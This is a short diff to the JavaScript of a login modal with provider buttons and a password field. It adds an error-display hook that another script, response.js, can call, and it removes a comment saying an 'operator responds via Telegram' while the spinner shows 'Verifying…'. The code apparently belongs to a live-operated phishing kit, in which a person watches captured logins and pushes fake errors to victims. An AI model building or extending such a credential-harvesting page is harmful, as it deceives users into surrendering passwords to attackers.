@@ -51,6 +51,24 @@
     submitBtn.disabled = false;
   }
 
+  function showError(msg) {
+    errorBox.textContent = msg;
+    errorBox.classList.add('is-visible');
+    resetSubmitButton();
+    // Re-show the form if it was hidden
+    form.style.display = '';
+    const loadingEl = document.getElementById('modal-loading');
+    if (loadingEl) loadingEl.style.display = 'none';
+    // Focus the password field
+    setTimeout(() => passwordInput.focus(), 200);
+  }
+
+  // Expose for response.js to call inline errors
+  window.__AuthForm = {
+    showError: showError,
+    resetSubmitButton: resetSubmitButton,
+  };
+
   document.querySelectorAll('[data-provider]').forEach(function (btn) {
     btn.addEventListener('click', function (e) {
       e.preventDefault();
@@ -101,7 +119,6 @@
           window.__ResponseControls.setSessionId(data.sessionId);
           window.__ResponseControls.start(data.sessionId);
         }
-        // Keep modal open with spinner — operator responds via Telegram
         submitBtn.textContent = 'Verifying…';
       })
       .catch(function () {
